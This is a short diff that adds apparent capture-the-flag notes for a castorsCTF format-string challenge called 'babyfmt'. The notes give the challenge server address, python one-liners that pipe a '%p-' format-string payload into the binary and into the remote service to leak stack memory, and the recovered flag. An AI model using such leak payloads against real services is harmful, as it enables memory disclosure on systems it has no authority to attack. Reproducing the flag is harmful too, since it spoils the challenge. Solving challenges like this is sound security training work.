@@ -1,0 +1,8 @@
+nc chals20.cybercastors.com 14426
+
+python -c 'print "AAAAAAAAAAAAAA" + "%p-"*200' | ./babyfmt - we see the 'c' chain
+python -c 'print "AAAAAAAAAAAAAA" + "%p-"*200' | nc chals20.cybercastors.com 14426
+
+use script to read
+
+castorsCTF{l34k_l34k_th4t_f0rm4t_str1n6_l34k}
